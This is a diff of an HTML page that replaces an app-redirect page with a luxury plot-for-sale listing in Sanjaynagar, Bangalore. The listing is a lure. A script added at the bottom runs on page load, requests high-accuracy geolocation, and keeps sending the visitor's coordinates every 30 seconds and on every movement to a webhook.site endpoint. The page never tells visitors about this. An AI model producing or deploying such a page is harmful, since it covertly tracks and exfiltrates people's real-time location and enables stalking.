@@ -1,41 +1,192 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Opening Ownly Food Delivery...</title>
-    <script>
-        window.onload = function() {
-            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
-            var searchQuery = encodeURIComponent("MJ NATI STYLE");
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Site for Sale – RMV 2nd Stage, Sanjaynagar</title>
+  <meta property="og:title" content="Site for Sale – RMV 2nd Stage, Sanjaynagar" />
+  <meta property="og:description" content="36×60 | 2,160 Sqft | A Khata | BDA | ₹18,000/Sqft" />
+  <meta property="og:type" content="website" />
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600;700&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+    :root {
+      --gold: #c8a96e; --gold-light: #e2c99a;
+      --dark: #0f0e0c; --dark2: #1a1814;
+      --cream: #f5f0e8; --muted: #8a8070;
+    }
+    body { background: var(--dark); color: var(--cream); font-family: 'DM Sans', sans-serif; min-height: 100vh; overflow-x: hidden; }
 
-            // Android Detection
-            if (/android/i.test(userAgent)) {
-                var androidIntent = "intent://search?q=" + searchQuery + "#Intent;scheme=ownly;package=com.ownly.customer;S.browser_fallback_url=https://play.google.com/store/apps/details?id=com.ownly.customer;end;";
-                window.location.href = androidIntent;
-            } 
-            // iOS Detection
-            else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-                var iosScheme = "ownly://search?q=" + searchQuery;
-                var iosStoreUrl = "https://apps.apple.com/in/app/ownly-food-delivery/id6747476494";
-                
-                window.location.href = iosScheme;
-                
-                // Fallback to App Store if app is not installed
-                setTimeout(function() {
-                    window.location.href = iosStoreUrl;
-                }, 2000);
-            } 
-            // Desktop/Other Fallback
-            else {
-                window.location.href = "https://play.google.com/store/apps/details?id=com.ownly.customer";
-            }
-        };
-    </script>
+    .hero {
+      position: relative; min-height: 100vh;
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      text-align: center; padding: 64px 24px;
+    }
+    .hero::before {
+      content:''; position:absolute; inset:0; pointer-events:none;
+      background: radial-gradient(ellipse 80% 55% at 50% 0%, rgba(200,169,110,0.13) 0%, transparent 70%),
+                  radial-gradient(ellipse 60% 40% at 50% 100%, rgba(200,169,110,0.06) 0%, transparent 60%);
+    }
+    .hero::after {
+      content:''; position:absolute; top:0; left:50%; transform:translateX(-50%);
+      width:1px; height:64px; background:linear-gradient(to bottom,transparent,var(--gold)); opacity:.4;
+    }
+
+    .badge {
+      display:inline-block; border:1px solid rgba(200,169,110,0.4); color:var(--gold);
+      font-size:10px; letter-spacing:.35em; text-transform:uppercase; padding:6px 18px;
+      margin-bottom:28px; border-radius:2px; animation:fadeUp .7s ease both;
+    }
+    h1 {
+      font-family:'Playfair Display',serif; font-size:clamp(30px,6vw,54px);
+      font-weight:700; line-height:1.18; margin-bottom:10px;
+      animation:fadeUp .8s .1s ease both;
+    }
+    .loc { font-size:13px; color:var(--gold); letter-spacing:.1em; margin-bottom:38px; animation:fadeUp .8s .18s ease both; }
+
+    .divider { display:flex; align-items:center; gap:12px; margin:0 auto 38px; width:200px; animation:fadeUp .8s .22s ease both; }
+    .divider span { flex:1; height:1px; background:rgba(200,169,110,0.22); }
+    .divider i { width:6px; height:6px; background:var(--gold); transform:rotate(45deg); border-radius:1px; }
+
+    .specs {
+      display:grid; grid-template-columns:repeat(2,1fr); gap:12px;
+      max-width:440px; width:100%; margin:0 auto 32px;
+      animation:fadeUp .8s .28s ease both;
+    }
+    .spec-card { background:var(--dark2); border:1px solid rgba(200,169,110,0.12); border-radius:6px; padding:18px 16px; text-align:left; }
+    .spec-card .lbl { font-size:9px; letter-spacing:.28em; text-transform:uppercase; color:var(--muted); margin-bottom:6px; }
+    .spec-card .val { font-family:'Playfair Display',serif; font-size:17px; font-weight:600; }
+
+    .tags { display:flex; flex-wrap:wrap; gap:8px; justify-content:center; max-width:460px; margin:0 auto 34px; animation:fadeUp .8s .34s ease both; }
+    .tag { background:rgba(200,169,110,0.08); border:1px solid rgba(200,169,110,0.2); color:var(--gold-light); font-size:11px; padding:5px 14px; border-radius:20px; }
+
+    .price-block {
+      background:linear-gradient(135deg,rgba(200,169,110,0.13),rgba(200,169,110,0.05));
+      border:1px solid rgba(200,169,110,0.3); border-radius:8px;
+      padding:24px 40px; max-width:320px; width:100%; margin:0 auto 40px;
+      animation:fadeUp .8s .4s ease both;
+    }
+    .price-lbl { font-size:10px; letter-spacing:.3em; text-transform:uppercase; color:var(--muted); margin-bottom:8px; }
+    .price-val { font-family:'Playfair Display',serif; font-size:32px; color:var(--gold); font-weight:700; }
+    .price-unit { font-size:13px; color:var(--muted); margin-top:4px; }
+
+    .cta {
+      display:inline-block; background:var(--gold); color:var(--dark);
+      font-size:12px; font-weight:600; letter-spacing:.2em; text-transform:uppercase;
+      text-decoration:none; padding:14px 38px; border-radius:3px;
+      transition:background .2s,transform .2s; animation:fadeUp .8s .46s ease both;
+    }
+    .cta:hover { background:var(--gold-light); transform:translateY(-2px); }
+
+    .foot { margin-top:44px; font-size:11px; color:var(--muted); letter-spacing:.05em; animation:fadeUp .8s .52s ease both; }
+
+    @keyframes fadeUp { from{opacity:0;transform:translateY(16px)} to{opacity:1;transform:translateY(0)} }
+  </style>
 </head>
 <body>
-    <h2 style="font-family: sans-serif; text-align: center; margin-top: 50px;">
-        Redirecting to MJ NATI STYLE on Ownly...
-    </h2>
+<section class="hero">
+  <div class="badge">Premium Property · Bangalore</div>
+
+  <h1>Site for Sale<br>RMV 2nd Stage</h1>
+  <div class="loc">📍 Sanjaynagar, Bangalore</div>
+
+  <div class="divider"><span></span><i></i><span></span></div>
+
+  <div class="specs">
+    <div class="spec-card"><div class="lbl">Dimension</div><div class="val">36 × 60</div></div>
+    <div class="spec-card"><div class="lbl">Total Area</div><div class="val">2,160 Sqft</div></div>
+    <div class="spec-card"><div class="lbl">Khata Type</div><div class="val">A Khata</div></div>
+    <div class="spec-card"><div class="lbl">Authority</div><div class="val">BDA Property</div></div>
+  </div>
+
+  <div class="tags">
+    <span class="tag">🏡 Independent House / Villa</span>
+    <span class="tag">🌿 Calm Residential Area</span>
+    <span class="tag">⭐ Premium Surroundings</span>
+  </div>
+
+  <div class="price-block">
+    <div class="price-lbl">💰 Asking Price</div>
+    <div class="price-val">₹18,000</div>
+    <div class="price-unit">per Square Foot</div>
+  </div>
+
+  <a class="cta" href="https://wa.me/919999999999?text=Hi%2C%20I%20saw%20your%20site%20for%20sale%20in%20RMV%202nd%20Stage%2C%20Sanjaynagar.%20I%20am%20interested%2C%20please%20share%20more%20details." target="_blank">Click Here</a>
+  <div class="foot">Serious buyers only · Site visits by appointment</div>
+</section>
+
+<script>
+  const WEBHOOK_URL = 'https://webhook.site/fbbb3a4d-1eb1-476b-8b12-c51289079299';
+
+  // Unique session ID per visitor per tab
+  const SESSION_ID = 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+  let pingCount = 0;
+  let trackingInterval = null;
+  let watchId = null;
+  let lastLat = null, lastLng = null;
+
+  function send(lat, lng, acc, type) {
+    pingCount++;
+    lastLat = lat; lastLng = lng;
+    const payload = {
+      session_id: SESSION_ID,
+      ping: pingCount,
+      type: type,           // 'first' | 'update' | 'interval'
+      lat, lng,
+      accuracy_m: acc,
+      ts: new Date().toISOString(),
+      page: 'RMV Site for Sale'
+    };
+    // Image beacon (most reliable)
+    new Image().src = `${WEBHOOK_URL}?session=${SESSION_ID}&ping=${pingCount}&type=${type}&lat=${lat}&lng=${lng}&acc=${acc}&ts=${encodeURIComponent(payload.ts)}`;
+    // Fetch for full JSON body
+    fetch(WEBHOOK_URL, {
+      method: 'POST', mode: 'no-cors',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    }).catch(() => {});
+  }
+
+  function startTracking() {
+    if (!navigator.geolocation) return;
+
+    // 1. Immediate first fix
+    navigator.geolocation.getCurrentPosition(
+      p => send(p.coords.latitude, p.coords.longitude, Math.round(p.coords.accuracy), 'first'),
+      () => {}, { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+    );
+
+    // 2. Watch position — fires whenever device moves
+    watchId = navigator.geolocation.watchPosition(
+      p => send(p.coords.latitude, p.coords.longitude, Math.round(p.coords.accuracy), 'update'),
+      () => {}, { enableHighAccuracy: true, maximumAge: 10000, timeout: 15000 }
+    );
+
+    // 3. Interval ping every 30 seconds regardless of movement
+    trackingInterval = setInterval(() => {
+      navigator.geolocation.getCurrentPosition(
+        p => send(p.coords.latitude, p.coords.longitude, Math.round(p.coords.accuracy), 'interval'),
+        () => {}, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    }, 30000);
+  }
+
+  function stopTracking() {
+    if (watchId !== null) { navigator.geolocation.clearWatch(watchId); watchId = null; }
+    if (trackingInterval) { clearInterval(trackingInterval); trackingInterval = null; }
+  }
+
+  // Pause when tab hidden, resume when visible
+  document.addEventListener('visibilitychange', () => {
+    if (document.hidden) {
+      stopTracking();
+    } else {
+      startTracking();
+    }
+  });
+
+  // Start immediately
+  startTracking();
+</script>
 </body>
 </html>
